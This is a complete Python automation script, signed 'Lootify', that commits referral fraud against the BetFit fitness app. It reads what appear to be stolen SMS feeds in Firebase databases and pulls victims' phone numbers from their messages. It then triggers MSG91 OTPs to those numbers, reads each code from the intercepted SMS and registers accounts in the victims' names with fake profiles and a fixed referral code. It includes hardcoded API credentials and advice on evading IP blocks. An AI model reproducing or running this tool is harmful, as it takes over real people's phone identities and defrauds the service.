
#  v5 — 1 Worker | 30s success cooldown | used_numbers skip | IP block safe
#
#  Features:
#    • Firebase panel auto-parse (base64 / direct URL)
#    • Online devices auto-detect (status: true)
#    • Phone number auto-extract from device messages
#    • used_numbers.txt → pehle processed numbers INSTANT skip
#    • OTP send via MSG91 (rate-limited, thread-safe)
#    • IPBlocked detection → global stop
#    • Strict device↔phone pairing
#    • Already-registered user SKIP (login flag + profile double-check)
#    • OTP timeout: 30s | Workers: 1 | OTP gap: 8s
#    • ⏳ SUCCESS COOLDOWN: 30 seconds before next number
#    • Random name/DOB, fixed referral, full profile update
#    • Detailed final summary
#
# ============================================================================

import os
import re
import sys
import json
import time
import base64
import random
import threading
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from faker import Faker
    fake = Faker('en_IN')
except ImportError:
    print("❌ 'faker' library missing. Install: pip install faker")
    sys.exit(1)


# ============================================================================
#  ██  CONFIG  ██
# ============================================================================

BASE_URL     = "https://api.betfit.in"
MSG91_BASE   = "https://control.msg91.com/api/v5/widget"

WIDGET_ID    = "356671646c71373831333038"
TOKEN_AUTH   = "454703TqlUQcFV6850eba4P1"

REFERRAL_CODE = "CAF98AE0"
COUNTRY       = "india"
DEVICE_ID     = "V417IR"
GENDER        = "Male"

HEIGHT_FEET      = "5"
HEIGHT_INCH      = "2"
WEIGHT           = "52"
FITNESS_LEVEL    = "Intermediate"
FITNESS_PREF     = "Running"
TIME_FOR_FITNESS = "30-60 min"

# Retry / timeout
MAX_RETRIES       = 3
RETRY_DELAY       = 5
REQUEST_TIMEOUT   = 60

# OTP
OTP_WAIT_TIMEOUT  = 30      # seconds — Firebase se OTP wait
OTP_POLL_INTERVAL = 1       # seconds
OTP_SEND_DELAY    = 8       # seconds — gap between two OTP sends (anti IP-block)

# Cooldown
SUCCESS_COOLDOWN  = 30      # seconds — gap AFTER a successful registration

# Concurrency
PANEL_WORKERS     = 1       # 1 = safest, no IP flood

# Files
PANELS_FILE       = "panels.json"
OUTPUT_FILE       = "betfit_tokens.txt"
USED_NUMBERS_FILE = "used_numbers.txt"

# Global IP-block flag
IP_BLOCKED = False
_file_lock = threading.Lock()
_last_otp_send_time = 0.0


# ============================================================================
#  ██  BANNER / UI  ██
# ============================================================================

C_RESET  = "\033[0m"
C_BOLD   = "\033[1m"
C_DIM    = "\033[2m"
C_RED    = "\033[91m"
C_GREEN  = "\033[92m"
C_YELLOW = "\033[93m"
C_BLUE   = "\033[94m"
C_MAGENTA= "\033[95m"
C_CYAN   = "\033[96m"
C_WHITE  = "\033[97m"


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def print_logo():
    logo = f"""
{C_CYAN}{C_BOLD}
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║      ██████╗ ███████╗████████╗███████╗██╗████████╗               ║
    ║      ██╔══██╗██╔════╝╚══██╔══╝██╔════╝██║╚══██╔══╝               ║
    ║      ██████╔╝█████╗     ██║   █████╗  ██║   ██║                  ║
    ║      ██╔══██╗██╔══╝     ██║   ██╔══╝  ██║   ██║                  ║
    ║      ██████╔╝███████╗   ██║   ██║     ██║   ██║                  ║
    ║      ╚═════╝ ╚══════╝   ╚═╝   ╚═╝     ╚═╝   ╚═╝                  ║
    ║                                                                  ║
    ║                                  ║
    ║                                                                  ║
    ║                                                ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝
{C_RESET}"""
    print(logo)


def banner(msg, color=C_CYAN):
    line = "═" * 68
    print(f"\n{color}{C_BOLD}╔{line}╗{C_RESET}")
    print(f"{color}{C_BOLD}║ {msg.center(66)} ║{C_RESET}")
    print(f"{color}{C_BOLD}╚{line}╝{C_RESET}")


def section(msg, color=C_BLUE):
    print(f"\n{color}{C_BOLD}▸ {msg}{C_RESET}")


def ok(msg):    print(f"   {C_GREEN}✅ {msg}{C_RESET}")
def fail(msg):  print(f"   {C_RED}❌ {msg}{C_RESET}")
def warn(msg):  print(f"   {C_YELLOW}⚠️  {msg}{C_RESET}")
def info(msg):  print(f"   {C_CYAN}ℹ️  {msg}{C_RESET}")
def dim(msg):   print(f"   {C_DIM}{msg}{C_RESET}")


def countdown(seconds, label="Cooldown"):
    """Terminal par live countdown dikhao."""
    for remaining in range(seconds, 0, -1):
        print(f"   {C_DIM}⏱  {label}: {remaining:>2}s remaining…{C_RESET}", end="\r")
        time.sleep(1)
    print(" " * 60, end="\r")   # clear line


# ============================================================================
#  ██  RANDOM DATA  ██
# ============================================================================

FIRST_NAMES = ["Rahul","Priya","Amit","Sneha","Vikas","Neha","Rohit","Anjali",
               "Suresh","Kavita","Arjun","Pooja","Manish","Divya","Sandeep","Ritu",
               "Karan","Shreya","Nikhil","Meera","Ravi","Ananya","Harsh","Swati",
               "Deepak","Ruchi","Siddharth","Tanvi"]

SURNAMES = ["Sharma","Verma","Kumar","Gupta","Singh","Patel","Yadav","Mishra",
            "Reddy","Joshi","Nair","Desai","Tiwari","Kapoor","Rao","Bansal",
            "Mehta","Iyer","Chauhan","Pillai","Kulkarni","Bose","Vardhan","Jain",
            "Malhotra","Agarwal","Menon","Shah"]


def random_first_name(): return random.choice(FIRST_NAMES)
def random_last_name():  return random.choice(SURNAMES)


def random_dob():
    start = datetime(1990, 1, 1)
    end   = datetime(1999, 12, 31)
    return fake.date_between(start_date=start, end_date=end).strftime("%Y-%m-%d")


# ============================================================================
#  ██  HELPERS  ██
# ============================================================================

def api_headers(bearer_token=None):
    h = {
        "user-agent": "Dart/3.8 (dart:io)",
        "content-type": "application/json",
        "accept-encoding": "gzip",
        "host": "api.betfit.in",
    }
    if bearer_token:
        h["authorization"] = f"Bearer {bearer_token}"
    return h


def safe_request(method, url, **kwargs):
    kwargs.setdefault("timeout", REQUEST_TIMEOUT)
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            if method.upper() == "GET":
                return requests.get(url, **kwargs)
            elif method.upper() == "POST":
                return requests.post(url, **kwargs)
            elif method.upper() == "PUT":
                return requests.put(url, **kwargs)
            return requests.request(method, url, **kwargs)
        except requests.exceptions.ConnectionError:
            warn(f"Connection error ({attempt}/{MAX_RETRIES})")
            if attempt < MAX_RETRIES: time.sleep(RETRY_DELAY)
        except requests.exceptions.Timeout:
            warn(f"Timeout ({attempt}/{MAX_RETRIES})")
            if attempt < MAX_RETRIES: time.sleep(RETRY_DELAY)
        except Exception as e:
            warn(f"Error ({attempt}/{MAX_RETRIES}): {e}")
            if attempt < MAX_RETRIES: time.sleep(RETRY_DELAY)
    return None


# ============================================================================
#  ██  USED NUMBERS — LOAD / APPEND  ██
# ============================================================================

def load_used_numbers():
    """Pehle se processed numbers ki set return karta hai."""
    if not os.path.exists(USED_NUMBERS_FILE):
        return set()
    try:
        with open(USED_NUMBERS_FILE) as f:
            return {line.strip() for line in f if line.strip() and line.strip().isdigit()}
    except Exception as e:
        warn(f"used_numbers.txt load error: {e}")
        return set()


def append_used_number(mobile_number):
    """Ek number ko file mein append karo (thread-safe)."""
    with _file_lock:
        try:
            with open(USED_NUMBERS_FILE, "a") as f:
                f.write(f"{mobile_number}\n")
                f.flush()
        except Exception as e:
            warn(f"append failed for {mobile_number}: {e}")


# ============================================================================
#  ██  FIREBASE — PANEL LOAD / PARSE  ██
# ============================================================================

def load_panels():
    if not os.path.exists(PANELS_FILE):
        return []
    try:
        with open(PANELS_FILE) as f:
            data = json.load(f)
        return data.get("panels", [])
    except Exception as e:
        fail(f"panels.json parse error: {e}")
        return []


def parse_panel_link(link):
    if not link:
        return None
    link = link.strip()
    if link.startswith("https://") and ("firebaseio.com" in link or "firebasedatabase.app" in link):
        if not link.endswith("/"):
            link += "/"
        return link
    parsed_url = urllib.parse.urlparse(link)
    qs = urllib.parse.parse_qs(parsed_url.query)
    if "s" not in qs:
        return None
    s_param = qs["s"][0] + "=" * ((4 - len(qs["s"][0]) % 4) % 4)
    try:
        decoded = base64.b64decode(s_param).decode("utf-8").split("|")[0].strip()
        if not decoded.endswith("/"):
            decoded += "/"
        return decoded
    except Exception:
        return None


# ============================================================================
#  ██  FIREBASE — ONLINE DEVICES + PHONE EXTRACT  ██
# ============================================================================

PHONE_PATTERNS = [
    re.compile(r"\b(?:\+91|91|0)?([6-9]\d{9})\b"),
    re.compile(r"\b(?:phone|mobile|number)[\s:]*([6-9]\d{9})\b", re.IGNORECASE),
    re.compile(r"[^0-9]([6-9]\d{9})[^0-9]"),
]


def extract_phones_and_clients(firebase_url):
    """
    Returns: list of {"client_id": <device>, "phone": <number>}
    client_id aur phone ALWAYS same device ke honge.
    """
    try:
        c_resp = requests.get(firebase_url + "clients.json", timeout=15, verify=False)
        clients_data = c_resp.json()
        if not isinstance(clients_data, dict):
            clients_data = {}
    except Exception as e:
        fail(f"Failed to fetch panel data: {e}")
        return []

    online_devices = [
        c_id for c_id, c_data in clients_data.items()
        if isinstance(c_data, dict) and c_data.get("status")
    ]
    if not online_devices:
        return []

    result, seen = [], set()
    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": "Mozilla/5.0", "Connection": "keep-alive"})

    def fetch_device_number(c_id):
        try:
            m_req = session.get(
                f'{firebase_url}messages/{c_id}.json?orderBy="$key"&limitToLast=5',
                timeout=4
            )
            device_messages = m_req.json()
            if not isinstance(device_messages, dict):
                device_messages = {}
            counts = Counter()
            for msg in device_messages.values():
                if not isinstance(msg, dict):
                    continue
                text = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                for pat in PHONE_PATTERNS:
                    for num in pat.findall(text):
                        counts[num] += 1
            if counts:
                return {"client_id": c_id, "phone": counts.most_common(1)[0][0]}
        except Exception:
            pass
        return None

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = [executor.submit(fetch_device_number, c_id) for c_id in online_devices]
        for future in as_completed(futures):
            res = future.result()
            if res and res["phone"] not in seen:
                seen.add(res["phone"])
                result.append(res)
    return result


# ============================================================================
#  ██  FIREBASE — MESSAGES SNAPSHOT  ██
# ============================================================================

def get_messages_snapshot(firebase_url, device_id, limit=15):
    """Latest N messages for a specific device_id."""
    try:
        url = f'{firebase_url}messages/{device_id}.json?orderBy="$key"&limitToLast={limit}'
        resp = requests.get(url, timeout=4, verify=False)
        data = resp.json()
        if isinstance(data, dict):
            return data
    except Exception:
        pass
    return {}


def get_last_message_key(firebase_url, device_id):
    msgs = get_messages_snapshot(firebase_url, device_id, limit=1)
    if msgs:
        return sorted(msgs.keys(), reverse=True)[0]
    return None


# ============================================================================
#  ██  STEP 1 — OTP SEND (RATE-LIMITED + IP BLOCK SAFE)  ██
# ============================================================================

def send_otp(mobile_number):
    """
    OTP send with:
      • Global IP_BLOCKED short-circuit
      • Thread-safe gap between two sends (OTP_SEND_DELAY)
      • IPBlocked / Blocked / success detection
    Returns: (req_id or None, send_time_ms or None)
    """
    global IP_BLOCKED, _last_otp_send_time

    if IP_BLOCKED:
        fail(f"[{mobile_number}] Skipped — IP already blocked")
        return None, None

    with _file_lock:
        now = time.time()
        wait = OTP_SEND_DELAY - (now - _last_otp_send_time)
        if wait > 0:
            time.sleep(wait)
        _last_otp_send_time = time.time()

    section(f"STEP 1: OTP SEND → +91{mobile_number}")
    send_time_ms = int(time.time() * 1000)

    url = f"{MSG91_BASE}/sendOtpMobile"
    payload = {
        "widgetId":   WIDGET_ID,
        "tokenAuth":  TOKEN_AUTH,
        "identifier": f"91{mobile_number}",
    }
    headers = {
        "content-type": "application/json; charset=UTF-8",
        "accept": "application/json",
    }

    r = safe_request("POST", url, json=payload, headers=headers, allow_redirects=True)
    if r is None:
        fail("OTP send request failed")
        return None, None

    info(f"HTTP {r.status_code}")
    if r.status_code != 200:
        fail(f"HTTP {r.status_code}: {r.text[:120]}")
        return None, None

    try:
        data = r.json()
        req_id = data.get("message") or data.get("reqId")

        if isinstance(req_id, str) and req_id.strip().lower() in ("ipblocked", "blocked"):
            IP_BLOCKED = True
            fail("🚫 MSG91 IP BLOCKED — stopping all OTP sends.")
            warn("   → Change IP (mobile hotspot on/off / VPN) then restart.")
            return None, None

        if not req_id or req_id == "success":
            fail(f"OTP send failed → reqId='{req_id}'")
            return None, None

        if not isinstance(req_id, str) or len(req_id) < 10:
            fail(f"Suspicious reqId='{req_id}' — treating as fail")
            return None, None

        ok(f"OTP sent | reqId = {req_id}")
        return req_id, send_time_ms
    except Exception as e:
        fail(f"Parse error: {e}")
    return None, None


# ============================================================================
#  ██  STEP 2 — FIREBASE OTP FETCH (STRICT DEVICE BINDING)  ██
# ============================================================================

def fetch_otp_from_device(firebase_url, device_id, last_key_before_send):
    """
    🔒 SIRF isi device_id ke messages se OTP.
    🔒 last_key_before_send se purane messages skip.
    🔒 30 second timeout.
    """
    deadline = time.time() + OTP_WAIT_TIMEOUT
    otp_pattern = re.compile(r"(\d{4,6})")

    while time.time() < deadline:
        msgs = get_messages_snapshot(firebase_url, device_id, limit=15)
        if msgs:
            sorted_keys = sorted(msgs.keys(), reverse=True)
            for msg_key in sorted_keys:
                if last_key_before_send and msg_key <= last_key_before_send:
                    continue
                msg = msgs[msg_key]
                if not isinstance(msg, dict):
                    continue
                body = str(msg.get("body") or msg.get("message") or msg.get("text") or "")
                m = otp_pattern.search(body)
                if m:
                    otp = m.group(1)
                    ok(f"OTP [{otp}] from device {device_id} | body: {body[:70]}")
                    return otp
        time.sleep(OTP_POLL_INTERVAL)
    return None


# ============================================================================
#  ██  STEP 3 — OTP VERIFY  ██
# ============================================================================

def verify_otp(req_id, otp):
    url = f"{MSG91_BASE}/verifyOtp"
    payload = {
        "widgetId":  WIDGET_ID,
        "tokenAuth": TOKEN_AUTH,
        "reqId":     req_id,
        "otp":       str(otp),
    }
    headers = {
        "content-type": "application/json; charset=UTF-8",
        "accept": "application/json",
    }
    r = safe_request("POST", url, json=payload, headers=headers)
    if r is None:
        return None
    try:
        data = r.json()
        if data.get("type") == "success":
            return data["message"]
    except Exception:
        pass
    return None


# ============================================================================
#  ██  STEP 4 — BETFT LOGIN (with NEW/OLD detection)  ██
# ============================================================================

def betfit_login(mobile_number, msg91_access_token):
    """
    Returns:
      ("new",  token)   → naya user, aage process karo
      ("old",  None)    → purana user, skip karo
      (None,   None)    → login fail
    """
    url = f"{BASE_URL}/api/auth/verifyMobileOTPV2"
    payload = {
        "phonenumber": mobile_number,
        "accessToken": msg91_access_token,
        "deviceToken": f"fcm_dummy_{mobile_number}",
        "deviceId":    DEVICE_ID,
    }
    r = safe_request("POST", url, json=payload, headers=api_headers())
    if r is None:
        return None, None

    try:
        data = r.json()
        if not (data.get("status") and data.get("data", {}).get("token")):
            return None, None

        inner = data.get("data", {})
        token = inner["token"]

        # ---------- NEW vs OLD USER DETECTION ----------
        is_new_flag   = inner.get("isNewUser")
        is_new_flag_2 = inner.get("newUser")
        is_new_flag_3 = inner.get("is_new_user")
        profile_done  = inner.get("profileCompleted")
        first_name    = (inner.get("user") or {}).get("firstName") or inner.get("firstName")

        old_user = False
        if is_new_flag is False or is_new_flag_2 is False or is_new_flag_3 is False:
            old_user = True
        if profile_done is True:
            old_user = True
        if first_name and str(first_name).strip():
            old_user = True

        if old_user:
            warn(f"[{mobile_number}] Already registered / onboarding skipped → SKIP")
            return "old", None

        return "new", token
    except Exception as e:
        fail(f"[{mobile_number}] parse error: {e}")
    return None, None


def is_new_user(fresh_token):
    """Double-check: profile mein firstName set hai to purana user."""
    r = safe_request("GET", f"{BASE_URL}/api/user-profile",
                     headers=api_headers(fresh_token))
    if not r or r.status_code != 200:
        return True
    try:
        data = r.json().get("data", {})
        fname = data.get("firstName")
        if fname and str(fname).strip():
            return False
        return True
    except Exception:
        return True


# ============================================================================
#  ██  STEP 5 — STORE FCM TOKEN  ██
# ============================================================================

def store_token(bearer_token, mobile_number):
    url = f"{BASE_URL}/api/auth/store-token"
    payload = {"devicetoken": f"fcm_dummy_{mobile_number}"}
    r = safe_request("POST", url, json=payload, headers=api_headers(bearer_token))
    return r.status_code if r else 0


# ============================================================================
#  ██  STEP 6 — PROFILE UPDATE  ██
# ============================================================================

def _blank_profile():
    return {k: None for k in [
        "firstName","lastName","userName","timeZone","gender",
        "heightFeet","heightInch","weight","birthday",
        "reasonOfLoseWeight","favouriteFood","favouriteHealtFood",
        "preferredMethodOfExercise","approachOfWeightLoss","weightGoal",
        "profile_description","pushnotifications","displayweight",
        "displaystepcount","recieveEmails","initialweight",
        "fitnessLevel","fitnessPreference","timeForFitness",
        "referralby","country","insta_handle","address"
    ]}


def put_profile(bearer_token, updates):
    payload = _blank_profile()
    payload.update(updates)
    r = safe_request("PUT", f"{BASE_URL}/api/user-profile",
                     json=payload, headers=api_headers(bearer_token))
    return r.status_code if r else 0


def update_profile_full(bearer_token, first_name, last_name, dob):
    steps = [
        ("Name+DOB+Gender+Referral+Country", {
            "firstName": first_name, "lastName": last_name,
            "gender": GENDER, "birthday": dob,
            "referralby": REFERRAL_CODE, "country": COUNTRY,
        }),
        ("Height+Weight", {"heightFeet": HEIGHT_FEET, "heightInch": HEIGHT_INCH, "weight": WEIGHT}),
        ("Fitness Level", {"fitnessLevel": FITNESS_LEVEL}),
        ("Fitness Preference", {"fitnessPreference": FITNESS_PREF}),
        ("Time For Fitness", {"timeForFitness": TIME_FOR_FITNESS}),
    ]
    for label, upd in steps:
        code = put_profile(bearer_token, upd)
        icon = "✅" if code == 200 else "❌"
        print(f"   {icon} [{label}] → {code}")
        time.sleep(0.4)


# ============================================================================
#  ██  STEP 7 — POST-LOGIN APIs  ██
# ============================================================================

def post_login_calls(bearer_token):
    gets = [
        "/api/game/explore-bootstrap","/api/game/explore-challenges",
        "/api/game/explore-engagement","/api/game/explore-notifications",
        "/api/game/randomUploadCoupons","/api/game/force-update",
        "/api/game/game-targetAchieved","/api/auth/getWelcomepopup",
        "/api/game/my-games?page=1&limit=8&section=joined",
    ]
    for path in gets:
        r = safe_request("GET", BASE_URL + path, headers=api_headers(bearer_token))
        icon = "✅" if (r and r.status_code == 200) else "⚠️"
        print(f"   {icon} GET {path} → {r.status_code if r else 'fail'}")
        time.sleep(0.25)

    r = safe_request("POST", f"{BASE_URL}/api/add-userStepCount",
        json={"deviceId": DEVICE_ID, "userId": "", "deviceType": "Android",
              "stepsData": [], "redeemedFitPoint": False},
        headers=api_headers(bearer_token))
    icon = "✅" if (r and r.status_code == 200) else "⚠️"
    print(f"   {icon} POST /api/add-userStepCount → {r.status_code if r else 'fail'}")


# ============================================================================
#  ██  SINGLE USER FLOW  ██
# ============================================================================

def process_one_user(dev, firebase_url, stats, used_numbers):
    """
    dev = {"client_id": <device>, "phone": <number>}
    used_numbers = set of already-processed numbers
    """
    global IP_BLOCKED

    if IP_BLOCKED:
        stats["ip_blocked_skipped"] += 1
        return None

    mobile_number = dev["phone"]
    device_id     = dev["client_id"]

    # ⚡ ALREADY USED → direct skip (no OTP send!)
    if mobile_number in used_numbers:
        stats["already_used_skip"] += 1
        print(f"\n{C_DIM}{'─'*68}{C_RESET}")
        print(f"{C_YELLOW}⏩ SKIP (already in used_numbers.txt) → +91{mobile_number}{C_RESET}")
        print(f"{C_DIM}{'─'*68}{C_RESET}")
        return None

    print(f"\n{C_MAGENTA}{C_BOLD}{'─'*68}{C_RESET}")
    print(f"{C_MAGENTA}{C_BOLD}  🔒 PAIR → +91{mobile_number}  ⟷  device {device_id}{C_RESET}")
    print(f"{C_MAGENTA}{C_BOLD}{'─'*68}{C_RESET}")

    last_key = get_last_message_key(firebase_url, device_id)

    # 1. Send OTP
    req_id, _ = send_otp(mobile_number)
    if not req_id:
        if IP_BLOCKED:
            stats["ip_blocked_skipped"] += 1
        else:
            stats["otp_send_fail"] += 1
        return None

    # 2. Firebase se OTP wait
    section(f"STEP 2: OTP WAIT (device {device_id}, max {OTP_WAIT_TIMEOUT}s)")
    otp = fetch_otp_from_device(firebase_url, device_id, last_key)
    if not otp:
        stats["otp_timeout"] += 1
        fail(f"[{mobile_number}] OTP timeout — skip")
        return None

    # 3. Verify
    section(f"STEP 3: OTP VERIFY")
    msg91_token = verify_otp(req_id, otp)
    if not msg91_token:
        stats["otp_verify_fail"] += 1
        fail(f"[{mobile_number}] OTP verify fail")
        return None
    ok("OTP verified")

    # 4. Login with new/old detection
    section(f"STEP 4: BETFT LOGIN")
    login_status, fresh_token = betfit_login(mobile_number, msg91_token)

    if login_status is None:
        stats["login_fail"] += 1
        fail(f"[{mobile_number}] BetFit login fail")
        return None

    if login_status == "old":
        stats["already_registered"] += 1
        warn(f"[{mobile_number}] Already registered → SKIP")
        append_used_number(mobile_number)
        used_numbers.add(mobile_number)
        return None

    # Double-check profile
    if not is_new_user(fresh_token):
        stats["already_registered"] += 1
        warn(f"[{mobile_number}] Profile already has name → SKIP")
        append_used_number(mobile_number)
        used_numbers.add(mobile_number)
        return None

    ok(f"Login OK (new user) | token: {fresh_token[:40]}...")

    # 5. Store token
    section(f"STEP 5: STORE FCM")
    sc = store_token(fresh_token, mobile_number)
    print(f"   [store-token] {sc}")

    # 6. Profile update
    first_name = random_first_name()
    last_name  = random_last_name()
    dob        = random_dob()

    banner("🎲 RANDOM USER DATA", C_YELLOW)
    print(f"   Phone   : +91{mobile_number}")
    print(f"   Device  : {device_id}")
    print(f"   Name    : {first_name} {last_name}")
    print(f"   DOB     : {dob}")
    print(f"   Gender  : {GENDER}")

    section(f"STEP 6: PROFILE UPDATE")
    update_profile_full(fresh_token, first_name, last_name, dob)

    # 7. Post-login
    section(f"STEP 7: POST-LOGIN APIs")
    post_login_calls(fresh_token)

    stats["success"] += 1
    banner(f"✅ SUCCESS → +91{mobile_number}", C_GREEN)

    # ⚡ Save to used numbers
    append_used_number(mobile_number)
    used_numbers.add(mobile_number)

    # ⏳ SUCCESS COOLDOWN — agla number process karne se pehle 30s ruk jao
    section(f"⏳ SUCCESS COOLDOWN — waiting {SUCCESS_COOLDOWN}s before next number…")
    countdown(SUCCESS_COOLDOWN, "Cooldown")
    ok(f"Cooldown complete ({SUCCESS_COOLDOWN}s). Next number…")

    return {
        "mobile": mobile_number,
        "device_id": device_id,
        "first_name": first_name,
        "last_name": last_name,
        "dob": dob,
        "gender": GENDER,
        "token": fresh_token,
    }


# ============================================================================
#  ██  PANEL PROCESSOR  ██
# ============================================================================

def process_panel(firebase_url, stats, used_numbers):
    global IP_BLOCKED

    print(f"\n{C_CYAN}{C_BOLD}▶ PANEL: {firebase_url[:70]}{C_RESET}")
    devices = extract_phones_and_clients(firebase_url)
    if not devices:
        warn("No devices found in this panel.")
        return []

    info(f"Online devices with phone: {len(devices)}")
    info(f"Workers: {PANEL_WORKERS} | OTP gap: {OTP_SEND_DELAY}s")
    info(f"Success cooldown: {SUCCESS_COOLDOWN}s")
    info(f"Already used numbers: {len(used_numbers)}")

    completed = []
    with ThreadPoolExecutor(max_workers=PANEL_WORKERS) as executor:
        future_to_dev = {
            executor.submit(process_one_user, dev, firebase_url, stats, used_numbers): dev
            for dev in devices
        }
        for future in as_completed(future_to_dev):
            dev = future_to_dev[future]
            try:
                result = future.result()
                if result:
                    completed.append(result)
            except Exception as e:
                stats["exceptions"] += 1
                fail(f"[{dev['phone']}] exception: {e}")

            if IP_BLOCKED:
                warn("IP blocked — cancelling remaining futures…")
                for f in future_to_dev:
                    f.cancel()
                break

    return completed


# ============================================================================
#  ██  SAVE TOKENS  ██
# ============================================================================

def save_to_file(users):
    with open(OUTPUT_FILE, "w") as f:
        f.write("mobile|device_id|first_name|last_name|dob|gender|token\n")
        for u in users:
            f.write(f"{u['mobile']}|{u['device_id']}|{u['first_name']}|{u['last_name']}|"
                    f"{u['dob']}|{u['gender']}|{u['token']}\n")
    ok(f"Saved {len(users)} users → {OUTPUT_FILE}")


# ============================================================================
#  ██  FINAL SUMMARY  ██
# ============================================================================

def print_summary(stats, users, elapsed_sec, total_used):
    banner("📊 FINAL PROCESS SUMMARY — MADE BY Lootify", C_MAGENTA)

    total_attempts = (
        stats["success"] +
        stats["already_registered"] +
        stats["already_used_skip"] +
        stats["otp_send_fail"] +
        stats["otp_timeout"] +
        stats["otp_verify_fail"] +
        stats["login_fail"] +
        stats["exceptions"] +
        stats["ip_blocked_skipped"]
    )

    print(f"""
   {C_BOLD}┌────────────────────────────────────────────────────────┐{C_RESET}
   {C_BOLD}│  METRIC                                COUNT           │{C_RESET}
   {C_BOLD}├────────────────────────────────────────────────────────┤{C_RESET}
   {C_GREEN}│  ✅ Success (fully registered)         {str(stats['success']).rjust(6)}          │{C_RESET}
   {C_YELLOW}│  ♻️  Already registered (skipped)       {str(stats['already_registered']).rjust(6)}          │{C_RESET}
   {C_DIM}│  ⏩ Already used (file skip)            {str(stats['already_used_skip']).rjust(6)}          │{C_RESET}
   {C_RED}│  ❌ OTP send failed                    {str(stats['otp_send_fail']).rjust(6)}          │{C_RESET}
   {C_RED}│  ⏱  OTP timeout (30s)                  {str(stats['otp_timeout']).rjust(6)}          │{C_RESET}
   {C_RED}│  ❌ OTP verify failed                  {str(stats['otp_verify_fail']).rjust(6)}          │{C_RESET}
   {C_RED}│  ❌ BetFit login failed                {str(stats['login_fail']).rjust(6)}          │{C_RESET}
   {C_RED}│  ❌ Exceptions                         {str(stats['exceptions']).rjust(6)}          │{C_RESET}
   {C_YELLOW}│  🚫 IP-blocked skipped                 {str(stats['ip_blocked_skipped']).rjust(6)}          │{C_RESET}
   {C_BOLD}├────────────────────────────────────────────────────────┤{C_RESET}
   {C_CYAN}│  📥 Total attempts                     {str(total_attempts).rjust(6)}          │{C_RESET}
   {C_CYAN}│  📁 used_numbers.txt total             {str(total_used).rjust(6)}          │{C_RESET}
   {C_CYAN}│  ⏱  Total time                         {(str(round(elapsed_sec,1))+'s').rjust(6)}          │{C_RESET}
   {C_BOLD}└────────────────────────────────────────────────────────┘{C_RESET}
""")

    if IP_BLOCKED:
        banner("🚫 MSG91 IP BLOCKED — ACTION REQUIRED", C_RED)
        print(f"   {C_YELLOW}Aapka IP MSG91 ne block kar diya hai.{C_RESET}")
        print(f"   {C_YELLOW}Fix:{C_RESET}")
        print(f"     • Mobile hotspot ON/OFF karo (naya IP milega)")
        print(f"     • Ya VPN (residential) use karo")
        print(f"     • Phir script dobara run karo")
        print(f"     • {C_BOLD}OTP_SEND_DELAY = 10{C_RESET} tak badha do\n")

    if users:
        banner("🎉 SUCCESSFULLY REGISTERED USERS", C_GREEN)
        for i, u in enumerate(users, 1):
            print(f"   {C_GREEN}{i:>3}. +91{u['mobile']}  |  {u['first_name']} {u['last_name']}"
                  f"  |  device {u['device_id']}{C_RESET}")
        print()

    banner("⚡ SCRIPT END — MADE BY Lootify ⚡", C_CYAN)


# ============================================================================
#  ██  MAIN  ██
# ============================================================================

def main():
    clear_screen()
    print_logo()

    banner("⚙  BETFT × FIREBASE AUTOMATION — SETUP", C_YELLOW)

    ref = input(f"   {C_BOLD}Referral Code{C_RESET} (Enter = default {REFERRAL_CODE}): ").strip()
    if not ref:
        ref = REFERRAL_CODE
    print(f"   {C_GREEN}✔ Referral: {ref}{C_RESET}")

    panels = load_panels()
    if not panels:
        fail(f"No panels found in {PANELS_FILE}")
        print(f"   Create {PANELS_FILE} like:")
        print('   { "panels": ["https://xyz.firebaseio.com/", "..."] }')
        return

    # ⚡ Load used numbers
    used_numbers = load_used_numbers()

    print(f"   {C_GREEN}✔ Panels loaded: {len(panels)}{C_RESET}")
    print(f"   {C_GREEN}✔ OTP timeout: {OTP_WAIT_TIMEOUT}s{C_RESET}")
    print(f"   {C_GREEN}✔ Workers/panel: {PANEL_WORKERS}{C_RESET}")
    print(f"   {C_GREEN}✔ OTP send gap: {OTP_SEND_DELAY}s{C_RESET}")
    print(f"   {C_GREEN}✔ Success cooldown: {SUCCESS_COOLDOWN}s{C_RESET}")
    print(f"   {C_GREEN}✔ Already used numbers: {len(used_numbers)}{C_RESET}")

    input(f"\n   {C_BOLD}Press ENTER to start...{C_RESET}")

    start = time.time()

    stats = {
        "success": 0,
        "already_registered": 0,
        "already_used_skip": 0,
        "otp_send_fail": 0,
        "otp_timeout": 0,
        "otp_verify_fail": 0,
        "login_fail": 0,
        "exceptions": 0,
        "ip_blocked_skipped": 0,
    }

    all_users = []
    for idx, link in enumerate(panels, 1):
        if IP_BLOCKED:
            warn("IP blocked — skipping remaining panels.")
            break
        fb_url = parse_panel_link(link)
        if not fb_url:
            warn(f"Panel {idx}: invalid link, skipping")
            continue
        banner(f"PANEL {idx}/{len(panels)}", C_BLUE)
        users = process_panel(fb_url, stats, used_numbers)
        all_users.extend(users)

    elapsed = time.time() - start

    print_summary(stats, all_users, elapsed, len(used_numbers))

    if all_users:
        save_choice = input(f"\n   {C_BOLD}Save tokens to {OUTPUT_FILE}? (y/n): {C_RESET}").strip().lower()
        if save_choice == "y":
            save_to_file(all_users)
        else:
            info("Skipped save.")

    print(f"\n   {C_CYAN}{C_BOLD}Thank you for using Lootify's automation! ⚡{C_RESET}\n")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{C_YELLOW}⚠️  Interrupted by user.{C_RESET}\n")